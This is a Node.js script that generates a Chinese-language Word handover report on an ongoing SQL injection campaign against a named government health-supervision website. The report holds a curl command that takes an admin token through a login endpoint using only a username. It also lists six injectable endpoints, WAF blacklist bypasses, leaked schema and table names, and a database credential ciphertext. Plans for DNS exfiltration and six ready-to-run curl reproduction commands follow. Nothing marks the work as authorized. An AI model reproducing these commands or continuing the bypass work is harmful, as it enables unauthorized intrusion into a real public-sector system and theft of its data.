const fs = require('fs');
const { Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell,
  Header, Footer, AlignmentType, HeadingLevel, BorderStyle, WidthType,
  ShadingType, PageNumber, PageBreak, LevelFormat } = require('docx');

const border = { style: BorderStyle.SINGLE, size: 1, color: "999999" };
const borders = { top: border, bottom: border, left: border, right: border };
const cm = { top: 60, bottom: 60, left: 100, right: 100 };
const CW = 9360;

function hcell(t, w) { return new TableCell({ borders, width: { size: w, type: WidthType.DXA }, shading: { fill: "2B579A", type: ShadingType.CLEAR }, margins: cm, children: [new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: t, bold: true, color: "FFFFFF", font: "Arial", size: 18 })] })] }); }
function dcell(t, w) { return new TableCell({ borders, width: { size: w, type: WidthType.DXA }, margins: cm, children: [new Paragraph({ children: [new TextRun({ text: t, font: "Arial", size: 18 })] })] }); }
function h1(t) { return new Paragraph({ heading: HeadingLevel.HEADING_1, spacing: { before: 360, after: 200 }, children: [new TextRun({ text: t, font: "Arial", bold: true, size: 32, color: "1A3A6B" })] }); }
function h2(t) { return new Paragraph({ heading: HeadingLevel.HEADING_2, spacing: { before: 280, after: 160 }, children: [new TextRun({ text: t, font: "Arial", bold: true, size: 28, color: "2B579A" })] }); }
function body(t) { return new Paragraph({ spacing: { after: 80, line: 340 }, children: [new TextRun({ text: t, font: "Arial", size: 20 })] }); }
function cmd(t) { return new Paragraph({ spacing: { after: 30, line: 240 }, shading: { fill: "F0F0F0", type: ShadingType.CLEAR }, indent: { left: 60 }, children: [new TextRun({ text: t, font: "Courier New", size: 16 })] }); }
function bullet(t) { return new Paragraph({ numbering: { reference: "b", level: 0 }, spacing: { after: 50 }, children: [new TextRun({ text: t, font: "Arial", size: 20 })] }); }
function empty() { return new Paragraph({ spacing: { after: 60 }, children: [] }); }

function makeTable(headers, rows, widths) {
  const hdrRow = new TableRow({ children: headers.map((h,i) => hcell(h, widths[i])) });
  const dRows = rows.map(r => new TableRow({ children: r.map((c,i) => dcell(c, widths[i])) }));
  return new Table({ width: { size: CW, type: WidthType.DXA }, columnWidths: widths, rows: [hdrRow, ...dRows] });
}

const pp = { page: { size: { width: 12240, height: 15840 }, margin: { top: 1000, right: 1440, bottom: 1000, left: 1440 } } };
const hd = { default: new Header({ children: [new Paragraph({ alignment: AlignmentType.RIGHT, children: [new TextRun({ text: "SQL注入交接文档 - 广西卫生监督执法系统", font: "Arial", size: 16, color: "999999" })] })] }) };
const ft = { default: new Footer({ children: [new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: "第 ", font: "Arial", size: 16 }), new TextRun({ children: [PageNumber.CURRENT], font: "Arial", size: 16 })] })] }) };

const kids = [];

// Title
kids.push(h1("SQL注入发现与利用现状"));
kids.push(body("目标：广西卫生监督执法系统（wsjdzf.gxws.cn，JeecgBoot 框架）"));
kids.push(body("交接日期：2026年7月14日"));
kids.push(empty());

// Section 1
kids.push(h2("一、当前状态"));
kids.push(bullet("已确认 6 个 SQL 注入端点"));
kids.push(bullet("已泄露 5 张表名 + 完整 SQL 结构 + 达梦数据库确认 + Java Mapper 路径"));
kids.push(bullet("WAF 函数黑名单已摸清，substrb / || / -- / 位运算符等可通过"));
kids.push(bullet("数据提取被 to_date() 约束 + WAF 双重封锁，暂时无法突破"));
kids.push(bullet("需要队友明天继续尝试绕过"));
kids.push(empty());

// Section 2
kids.push(h2("二、Token 获取"));
kids.push(body("在 Git Bash 中执行（一整行，不换行）："));
kids.push(cmd(`TOKEN=$(curl -s -k -X POST "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/loginsinglesign" -H "Content-Type: application/json" -d '{"username":"admin"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['result']['token'])")`));
kids.push(body("验证：echo $TOKEN 应输出一长串 eyJ0eXAiOiJKV1Qi..."));
kids.push(empty());

// Section 3
kids.push(h2("三、注入端点清单"));
kids.push(makeTable(
  ["端点URL", "注入参数", "确认方式", "to_date约束"],
  [
    ["/srstatistics/statistics/getDataScreen", "endTime / startTime", "单引号 -> MyBatis报错", "有"],
    ["/srstatistics/statistics/warninginfo", "endTime / startTime", "单引号 -> MyBatis报错", "有"],
    ["/srstatistics/statistics/taskcountbymonth", "startTime / endTime", "单引号 -> 异常", "有"],
    ["/srstatistics/statistics/taskcountregion", "startTime / endTime", "单引号 -> 异常", "有"],
    ["/sys/duplicate/check", "fieldVal", "单引号 -> 响应异常", "未知"],
    ["/srstatistics/statistics/task/region", "year", "单引号 -> 达梦错误", "无(SELFREGULATION不存在)"],
  ],
  [3100, 1800, 2400, 2060]
));
kids.push(empty());

// Section 4
kids.push(h2("四、WAF 对抗总结"));
kids.push(body("WAF 是 JeecgBoot 内置 SqlInjectionUtil.java，黑名单：exec|insert|select|delete|update|drop|count|chr|mid|master|truncate|char|declare|or|and|--|+"));
kids.push(empty());
kids.push(makeTable(
  ["可通过", "被拦截"],
  [
    ["单引号 '", "OR / AND"],
    ["-- 注释（达梦支持）", "= / < / > / like 比较符"],
    ["|| 字符串拼接（达梦/Oracle 语法）", "if( / exp( / decode( 条件函数"],
    ["/* */ 多行注释", "case when / then / else / end"],
    ["substrb() 函数（不在黑名单）", "length( / ascii( / chr( 字符函数"],
    ["^ / & / | 位运算符", "select / from"],
    ["user / sysdate / uid 关键字（无需括号）", "# 注释（MySQL专用，达梦不支持）"],
    ["1/0 除零", ""],
  ],
  [4680, 4680]
));
kids.push(empty());

// Section 5
kids.push(h2("五、已泄露的信息"));
kids.push(bullet("数据库类型：达梦 DM（dm.jdbc.driver.DMException）"));
kids.push(bullet("Schema：SELFREGULATION、NHIS2015"));
kids.push(bullet("表名：SR_TASK_MEDICAL_UNIT、SR_SELF_INSPECTION_TASK、NHIS2015.t_ic_medical、sr_task_norm"));
kids.push(bullet("Mapper：cn/mtm2000/modules/statistics/mapper/SrStatisticsMapper.java"));
kids.push(bullet("MySQL 数据源：127.0.0.1:3306/jeecg-boot，用户 root，密码密文 f5b6775e8d1749483f2320627de0e706（AES-128 加密，16 字节，密钥未知）"));
kids.push(empty());
kids.push(body("泄露的完整 SQL（getDataScreen 端点）："));
kids.push(cmd("SELECT count(1) from SR_TASK_MEDICAL_UNIT stmu"));
kids.push(cmd("  LEFT JOIN SR_SELF_INSPECTION_TASK ssit ON ssit.id = stmu.TASK_ID"));
kids.push(cmd("  LEFT JOIN NHIS2015.t_ic_medical tim ON stmu.COMP_NO = tim.COMP_NO"));
kids.push(cmd("    and tim.BUS_PCODE = 640000 and tim.data_type = 5 and tim.IS_DELETE = 0"));
kids.push(cmd("  WHERE (tim.bus_pcode = ? AND ssit.CREATE_TIME >= to_date(...)"));
kids.push(empty());

// Section 6
kids.push(h2("六、已尝试但失败的绕过"));
kids.push(bullet("大小写绕过（IF/EXP/DECODE） — 仍被拦"));
kids.push(bullet("CASE WHEN — when/then/else/end 被拦"));
kids.push(bullet("内联注释 /*!50000*/ — 达梦不支持"));
kids.push(bullet("# 注释 — 达梦不支持"));
kids.push(bullet("闭合 || 触发达梦运行时错误 — 字段太长（无法获取数据值）"));
kids.push(bullet("除零报错注入 — 错误消息不显示求值后的数据"));
kids.push(bullet("时间盲注（dbms_pipe）— 被拦"));
kids.push(empty());

// Section 7
kids.push(h2("七、建议明天尝试"));
kids.push(bullet("1. 达梦系统表遍历 — SYS.SYSOBJECTS / SYS.ALL_OBJECTS 可查所有表，需新绕过 select 拦截"));
kids.push(bullet("2. 找更多没有 to_date() 约束的注入点 — 436 个 API 可能还有遗漏"));
kids.push(bullet("3. utl_http.request DNS 外带 — 函数名能过 WAF，需要解决子查询被拦问题"));
kids.push(bullet("4. 研究 SqlInjectionUtil.java 源码正则缺陷 — checkSQLInject 的 \\s+\\S+ 有双重校验逻辑漏洞"));
kids.push(bullet("5. task/region 端点 year 参数 — 虽报 SELFREGULATION 不存在，但无 to_date 约束，SQL 上下文更可控"));
kids.push(empty());

// Section 8
kids.push(h2("八、复现命令（Git Bash 环境，先获取 TOKEN）"));
kids.push(empty());
kids.push(body("1. getDataScreen（泄露3表+完整SQL）："));
kids.push(cmd(`curl -s -k "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/srstatistics/statistics/getDataScreen?code=450000&startTime=2024-01-01&endTime=2024-12-31%27" -H "X-Access-Token: $TOKEN"`));
kids.push(empty());
kids.push(body("2. warninginfo（泄露 sr_task_norm）："));
kids.push(cmd(`curl -s -k "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/srstatistics/statistics/warninginfo?code=450000&startTime=2024-01-01&endTime=2024-12-31%27" -H "X-Access-Token: $TOKEN"`));
kids.push(empty());
kids.push(body("3. task/region（泄露 SELFREGULATION + 达梦确认）："));
kids.push(cmd(`curl -s -k "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/srstatistics/statistics/task/region?year=2026%27&code=450000" -H "X-Access-Token: $TOKEN"`));
kids.push(empty());
kids.push(body("4. taskcountbymonth："));
kids.push(cmd(`curl -s -k "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/srstatistics/statistics/taskcountbymonth?code=450000&startTime=2024-01-01&endTime=2024-12-31%27" -H "X-Access-Token: $TOKEN"`));
kids.push(empty());
kids.push(body("5. taskcountregion："));
kids.push(cmd(`curl -s -k "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/srstatistics/statistics/taskcountregion?code=450000&startTime=2024-01-01&endTime=2024-12-31%27" -H "X-Access-Token: $TOKEN"`));
kids.push(empty());
kids.push(body("6. duplicate/check："));
kids.push(cmd(`curl -s -k "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/duplicate/check?fieldName=id&fieldVal=1%27&tableName=sys_user" -H "X-Access-Token: $TOKEN"`));

const doc = new Document({
  styles: {
    default: { document: { run: { font: "Arial", size: 20 } } },
    paragraphStyles: [
      { id: "Heading1", name: "Heading 1", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 32, bold: true, font: "Arial", color: "1A3A6B" },
        paragraph: { spacing: { before: 360, after: 200 }, outlineLevel: 0 } },
      { id: "Heading2", name: "Heading 2", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 28, bold: true, font: "Arial", color: "2B579A" },
        paragraph: { spacing: { before: 280, after: 160 }, outlineLevel: 1 } },
    ]
  },
  numbering: {
    config: [
      { reference: "b", levels: [{ level: 0, format: LevelFormat.BULLET, text: "•", alignment: AlignmentType.LEFT, style: { paragraph: { indent: { left: 720, hanging: 360 } } } }] },
    ]
  },
  sections: [{ properties: pp, headers: hd, footers: ft, children: kids }]
});

const outPath = "D:/Desktop/SQL注入交接文档.docx";
Packer.toBuffer(doc).then(buf => { fs.writeFileSync(outPath, buf); console.log("OK: " + outPath + " (" + buf.length + " bytes)"); });
